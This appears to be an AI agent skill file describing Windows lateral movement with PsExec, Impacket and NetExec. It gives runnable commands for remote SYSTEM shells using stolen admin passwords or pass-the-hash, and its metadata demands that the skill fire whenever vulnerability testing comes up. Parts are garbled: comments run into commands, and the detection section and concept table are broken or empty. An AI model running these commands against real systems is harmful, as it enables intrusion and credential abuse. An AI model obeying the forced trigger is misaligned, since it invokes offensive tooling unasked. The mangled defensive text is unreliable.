---
name: psexec-lateral-movement
description: >
  [CRITICAL: MUST trigger this skill whenever related vulnerability testing is discussed.]
  Execute commands and binaries on remote Windows systems utilizing PsExec and SMB/RPC 
  mechanisms. This skill details the mechanics behind tools like Sysinternals PsExec, Impacket's 
  psexec.py, and their role in lateral movement via hidden administrative shares.
domain: cybersecurity
subdomain: red-teaming
category: Lateral Movement
difficulty: intermediate
estimated_time: "1-2 hours"
mitre_attack:
  tactics: [TA0008, TA0002]
  techniques: [T1569.002, T1021.002]
platforms: [windows]
tags: [psexec, smb, lateral-movement, red-teaming, active-directory, impacket, rpc]
tools: [psexec.exe, impacket-psexec, crackmapexec]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# Lateral Movement via PsExec

## When to Use
- You have compromised valid domain administrator credentials or a local administrator account for a target system.
- You need to obtain an interactive command shell (`cmd.exe` or `powershell.exe`) or execute a payload on a remote Windows machine.
- SMB (Port 445) and RPC (Port 135) are accessible.

## Workflow

### Phase 1: Mechanics of PsExec

PsExec works by performing the following actions:
1. Authenticates via SMB over Port 445.
2. Connects to the `ADMIN$` hidden share (usually `C:\Windows`).
3. Uploads a service executable (e.g., `PSEXESVC.exe`).
4. Uses the Service Control Manager (SCM) via RPC to create and start a Windows service wrapping the executable.
5. Communicates input/output back via named pipes over SMB.

### Phase 2: Remote Execution with Impacket (Linux)

```bash
# # impacket-psexec Administrator:Password123!@192.168.1.100

# Using Pass-the-Hash (PTH) impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:88e4d9fabaecf3dec18dd80905521b29 Administrator@192.168.1.100
```

### Phase 3: Remote Execution with Sysinternals PsExec (Windows)

```cmd
# # PsExec.exe \\192.168.1.100 -u Domain\Administrator -p Password123! cmd.exe

# Execute SYSTEM shell PsExec.exe \\192.168.1.100 -s -u Domain\Administrator -p Password123! cmd.exe
```

### Phase 4: Automated Lateral Movement with CrackMapExec / NetExec

```bash
# netexec smb 192.168.1.0/24 -u Administrator -p Password123! -x "whoami"
```

#### Decision Point 🔀
```mermaid
flowchart TD
    A[Check SMB Access ] --> B{Admin Privs? ]}
    B -->|Yes| C[Upload Service ]
    B -->|No| D[PsExec Fails ]
    C --> E[Reverse Shell ]
```

## 🔵 Blue Team Detection & Defense
- **Monitor EID 7045 / 4697**: **Hunting Anomalous Pipe Names**: **Disable SMBv1 and Restrict Port 445**: Key Concepts
| Concept | Description |
|---------|-------------|
| Admin$ Share | |
| Named Pipes | |

## References
- Impacket Docs: [impacket-psexec](https://github.com/fortra/impacket/blob/master/examples/psexec.py)
- Microsoft: [PsExec Documentation](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec)
